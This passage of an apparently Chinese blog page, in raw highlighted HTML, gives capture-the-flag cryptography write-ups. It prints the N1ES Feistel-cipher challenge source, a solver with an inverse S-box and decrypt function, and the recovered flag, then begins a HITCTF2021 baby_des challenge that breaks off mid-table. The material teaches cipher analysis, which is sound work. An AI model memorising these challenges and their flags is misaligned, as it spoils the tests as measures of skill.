class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    digest = hashlib.sha256(a + b).digest()</span><br><span class="line">    <span class="keyword">return</span> digest[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join( <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_add</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    res = str_xor(f(a,b),f(b,a))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutate</span>(<span class="params">table, block</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_permutate</span>(<span class="params">table, block</span>):</span></span><br><span class="line">    t = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: block[x], string_to_list(table))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bits</span>(<span class="params">data</span>):</span></span><br><span class="line">    data = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    l = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            result[(pos&lt;&lt;<span class="number">3</span>)+i] = (ch&gt;&gt;i) &amp; <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_list</span>(<span class="params">data</span>):</span></span><br><span class="line">    a = []</span><br><span class="line">    a.extend(<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">55</span>, <span class="number">87</span>, <span class="number">54</span>, <span class="number">131</span>, <span class="number">139</span>, <span class="number">71</span>, <span class="number">3</span>, <span class="number">147</span>, <span class="number">34</span>, <span class="number">212</span>, <span class="number">231</span>, <span class="number">22</span>, <span class="number">170</span>, <span class="number">230</span>, <span class="number">154</span>, <span class="number">112</span>, <span class="number">81</span>, <span class="number">225</span>, <span class="number">218</span>, <span class="number">246</span>, <span class="number">227</span>, <span class="number">23</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">111</span>, <span class="number">189</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">250</span>, <span class="number">179</span>, <span class="number">60</span>, <span class="number">177</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">151</span>, <span class="number">50</span>, <span class="number">224</span>, <span class="number">25</span>, <span class="number">152</span>, <span class="number">221</span>, <span class="number">219</span>, <span class="number">242</span>, <span class="number">27</span>, <span class="number">115</span>, <span class="number">93</span>, <span class="number">208</span>, <span class="number">153</span>, <span class="number">35</span>, <span class="number">162</span>, <span class="number">30</span>, <span class="number">191</span>, <span class="number">105</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">243</span>, <span class="number">245</span>, <span class="number">186</span>, <span class="number">132</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">63</span>, <span class="number">254</span>, <span class="number">249</span>, <span class="number">165</span>, <span class="number">217</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">210</span>, <span class="number">241</span>, <span class="number">159</span>, <span class="number">188</span>, <span class="number">44</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">67</span>, <span class="number">144</span>, <span class="number">197</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">211</span>, <span class="number">69</span>, <span class="number">80</span>, <span class="number">160</span>, <span class="number">252</span>, <span class="number">84</span>, <span class="number">76</span>, <span class="number">158</span>, <span class="number">173</span>, <span class="number">157</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">86</span>, <span class="number">237</span>, <span class="number">38</span>, <span class="number">171</span>, <span class="number">51</span>, <span class="number">17</span>, <span class="number">229</span>, <span class="number">148</span>, <span class="number">39</span>, <span class="number">43</span>, <span class="number">196</span>, <span class="number">103</span>, <span class="number">57</span>, <span class="number">142</span>, <span class="number">77</span>, <span class="number">155</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">164</span>, <span class="number">91</span>, <span class="number">133</span>, <span class="number">16</span>, <span class="number">161</span>, <span class="number">141</span>, <span class="number">190</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">26</span>, <span class="number">207</span>, <span class="number">61</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">176</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">236</span>, <span class="number">9</span>, <span class="number">180</span>, <span class="number">203</span>, <span class="number">183</span>, <span class="number">128</span>, <span class="number">13</span>, <span class="number">124</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">182</span>, <span class="number">201</span>, <span class="number">233</span>, <span class="number">175</span>, <span class="number">130</span>, <span class="number">122</span>, <span class="number">52</span>, <span class="number">138</span>, <span class="number">220</span>, <span class="number">29</span>, <span class="number">178</span>, <span class="number">213</span>, <span class="number">145</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">174</span>, <span class="number">7</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">146</span>, <span class="number">98</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">194</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">206</span>, <span class="number">110</span>, <span class="number">235</span>, <span class="number">238</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">96</span>, <span class="number">228</span>, <span class="number">149</span>, <span class="number">0</span>, <span class="number">253</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">119</span>, <span class="number">32</span>, <span class="number">117</span>, <span class="number">134</span>, <span class="number">92</span>, <span class="number">53</span>, <span class="number">193</span>, <span class="number">94</span>, <span class="number">90</span>, <span class="number">172</span>, <span class="number">143</span>, <span class="number">185</span>, <span class="number">244</span>, <span class="number">199</span>, <span class="number">109</span>, <span class="number">102</span>, <span class="number">15</span>, <span class="number">85</span>, <span class="number">11</span>, <span class="number">209</span>, <span class="number">251</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">12</span>, <span class="number">120</span>, <span class="number">222</span>, <span class="number">255</span>, <span class="number">126</span>, <span class="number">226</span>, <span class="number">135</span>, <span class="number">40</span>, <span class="number">192</span>, <span class="number">150</span>, <span class="number">215</span>, <span class="number">240</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">97</span>, <span class="number">64</span>, <span class="number">36</span>, <span class="number">248</span>, <span class="number">82</span>, <span class="number">234</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">125</span>, <span class="number">198</span>, <span class="number">31</span>, <span class="number">5</span>, <span class="number">73</span>, <span class="number">187</span>, <span class="number">118</span>, <span class="number">106</span>, <span class="number">239</span>, <span class="number">169</span>, <span class="number">74</span>, <span class="number">95</span>, <span class="number">24</span>, <span class="number">20</span>, <span class="number">223</span>, <span class="number">19</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">216</span>, <span class="number">168</span>, <span class="number">108</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">247</span>, <span class="number">195</span>, <span class="number">66</span>, <span class="number">181</span>, <span class="number">121</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">o</span>):</span></span><br><span class="line">    k = permutate(o,s_box)</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(k), <span class="number">7</span>):</span><br><span class="line">        b.append(k[i:i+<span class="number">7</span>] + [<span class="number">1</span>])</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> b[i]:</span><br><span class="line">            x += (j&lt;&lt;pos)</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">        c.append((<span class="number">0x10001</span>**x) % (<span class="number">0x7f</span>))</span><br><span class="line">    <span class="keyword">return</span> permutate(o,s_box)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES_2</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">32</span> :</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;key must be 32 bytes long&quot;</span>)</span><br><span class="line">        self.key = key</span><br><span class="line">        self.gen_subkey()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span>(<span class="params">self</span>):</span></span><br><span class="line">        o = string_to_bits(self.key)</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            o = generate(o)</span><br><span class="line">            k.extend(o)</span><br><span class="line">            o = string_to_bits([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> o[<span class="number">0</span>:<span class="number">32</span>]])</span><br><span class="line">        self.Kn = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            t = <span class="built_in">map</span>(<span class="built_in">chr</span>, k[i * <span class="number">8</span>: i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">            self.Kn.append(<span class="string">&#x27;&#x27;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> t))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(plaintext) % <span class="number">16</span> != <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">isinstance</span>(plaintext, <span class="built_in">bytes</span>) == <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;plaintext must be a multiple of 16 in length&quot;</span>)</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext) / <span class="number">16</span>):</span><br><span class="line">            block = plaintext[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                L, R = R, str_xor(round_add(R, self.Kn[round_cnt]),L)</span><br><span class="line">                L, R = str_permutate(L,s_box) , str_permutate(R,s_box)</span><br><span class="line">            L, R = R, L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;7056b257805ec2b8325795b0e6061f89&quot;</span></span><br><span class="line">n1es = N1ES_2(key)</span><br><span class="line">cipher = n1es.encrypt(FLAG)</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(cipher)  <span class="comment"># TZPvbvJQ8l2T7G5NmrlDWPLoymq2See29B16+/xf+qk=</span></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>给了密钥，密文</p><p>依照对称性，写出解密函数</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">inv_s = [<span class="number">178</span>, <span class="number">218</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">174</span>, <span class="number">231</span>, <span class="number">59</span>, <span class="number">159</span>, <span class="number">22</span>, <span class="number">133</span>, <span class="number">203</span>, <span class="number">200</span>, <span class="number">205</span>, <span class="number">138</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">114</span>, <span class="number">98</span>, <span class="number">173</span>, <span class="number">243</span>, <span class="number">241</span>, <span class="number">67</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">240</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">43</span>, <span class="number">33</span>, <span class="number">152</span>, <span class="number">50</span>, <span class="number">230</span>, <span class="number">183</span>, <span class="number">244</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">221</span>, <span class="number">74</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">212</span>, <span class="number">60</span>, <span class="number">168</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">118</span>, <span class="number">164</span>, <span class="number">66</span>, <span class="number">36</span>, <span class="number">97</span>, <span class="number">149</span>, <span class="number">187</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">105</span>, <span class="number">141</span>, <span class="number">249</span>, <span class="number">31</span>, <span class="number">122</span>, <span class="number">92</span>, <span class="number">61</span>, <span class="number">220</span>, <span class="number">24</span>, <span class="number">253</span>, <span class="number">75</span>, <span class="number">225</span>, <span class="number">81</span>, <span class="number">226</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">232</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">86</span>, <span class="number">107</span>, <span class="number">245</span>, <span class="number">91</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">223</span>, <span class="number">142</span>, <span class="number">85</span>, <span class="number">199</span>, <span class="number">93</span>, <span class="number">1</span>, <span class="number">250</span>, <span class="number">140</span>, <span class="number">190</span>, <span class="number">112</span>, <span class="number">186</span>, <span class="number">45</span>, <span class="number">189</span>, <span class="number">239</span>, <span class="number">175</span>, <span class="number">219</span>, <span class="number">163</span>, <span class="number">217</span>, <span class="number">131</span>, <span class="number">180</span>, <span class="number">197</span>, <span class="number">104</span>, <span class="number">126</span>, <span class="number">52</span>, <span class="number">235</span>, <span class="number">181</span>, <span class="number">248</span>, <span class="number">196</span>, <span class="number">170</span>, <span class="number">25</span>, <span class="number">15</span>, <span class="number">156</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">119</span>, <span class="number">184</span>, <span class="number">234</span>, <span class="number">182</span>, <span class="number">206</span>, <span class="number">255</span>, <span class="number">148</span>, <span class="number">130</span>, <span class="number">139</span>, <span class="number">228</span>, <span class="number">209</span>, <span class="number">157</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">147</span>, <span class="number">3</span>, <span class="number">58</span>, <span class="number">113</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">28</span>, <span class="number">124</span>, <span class="number">150</span>, <span class="number">4</span>, <span class="number">53</span>, <span class="number">116</span>, <span class="number">106</span>, <span class="number">192</span>, <span class="number">76</span>, <span class="number">155</span>, <span class="number">162</span>, <span class="number">7</span>, <span class="number">100</span>, <span class="number">177</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">14</span>, <span class="number">108</span>, <span class="number">167</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">83</span>, <span class="number">115</span>, <span class="number">49</span>, <span class="number">204</span>, <span class="number">111</span>, <span class="number">64</span>, <span class="number">34</span>, <span class="number">160</span>, <span class="number">247</span>, <span class="number">237</span>, <span class="number">12</span>, <span class="number">96</span>, <span class="number">191</span>, <span class="number">88</span>, <span class="number">158</span>, <span class="number">146</span>, <span class="number">127</span>, <span class="number">32</span>, <span class="number">153</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">143</span>, <span class="number">136</span>, <span class="number">227</span>, <span class="number">193</span>, <span class="number">57</span>, <span class="number">233</span>, <span class="number">71</span>, <span class="number">26</span>, <span class="number">117</span>, <span class="number">51</span>, <span class="number">213</span>, <span class="number">188</span>, <span class="number">166</span>, <span class="number">252</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">229</span>, <span class="number">195</span>, <span class="number">73</span>, <span class="number">144</span>, <span class="number">27</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">201</span>, <span class="number">68</span>, <span class="number">80</span>, <span class="number">9</span>, <span class="number">154</span>, <span class="number">161</span>, <span class="number">215</span>, <span class="number">246</span>, <span class="number">65</span>, <span class="number">18</span>, <span class="number">41</span>, <span class="number">151</span>, <span class="number">40</span>, <span class="number">207</span>, <span class="number">242</span>, <span class="number">37</span>, <span class="number">17</span>, <span class="number">210</span>, <span class="number">20</span>, <span class="number">176</span>, <span class="number">99</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">79</span>, <span class="number">145</span>, <span class="number">224</span>, <span class="number">171</span>, <span class="number">132</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">216</span>, <span class="number">69</span>, <span class="number">42</span>, <span class="number">55</span>, <span class="number">194</span>, <span class="number">56</span>, <span class="number">19</span>, <span class="number">251</span>, <span class="number">222</span>, <span class="number">63</span>, <span class="number">29</span>, <span class="number">202</span>, <span class="number">84</span>, <span class="number">179</span>, <span class="number">62</span>, <span class="number">208</span>]</span><br><span class="line"></span><br><span class="line">def decrypt(self,cipher):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) / <span class="number">16</span>):</span><br><span class="line">        block = cipher[<span class="type">i</span> * <span class="number">16</span>:(<span class="type">i</span> + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        L = block[:<span class="number">8</span>]</span><br><span class="line">        <span class="built_in">R</span> = block[<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            L, <span class="built_in">R</span> = str_permutate(L,inv_s) , str_permutate(<span class="built_in">R</span>,inv_s)</span><br><span class="line">            L, <span class="built_in">R</span> =  <span class="built_in">R</span>,str_xor(round_add(<span class="built_in">R</span>, self.Kn[<span class="number">31</span> - <span class="type">round_cnt</span>]),L)</span><br><span class="line">        L, <span class="built_in">R</span> = <span class="built_in">R</span>, L</span><br><span class="line">        res += L + <span class="built_in">R</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#n1book&#123;4_3AsY_F3istel_n3tw0rk~~&#125;</span></span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>解密时，得用inv_s（<strong>S-box的逆置换</strong>）</li><li>解密时，Ki得是反序的</li></ul><h3 id="HITCTF2021·baby-des"><a href="#HITCTF2021·baby-des" class="headerlink" title="HITCTF2021·baby_des"></a>HITCTF2021·baby_des</h3><p><strong>Hint：</strong>Non lined s-box</p><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line">ROUNDS = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">IP_1 = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span 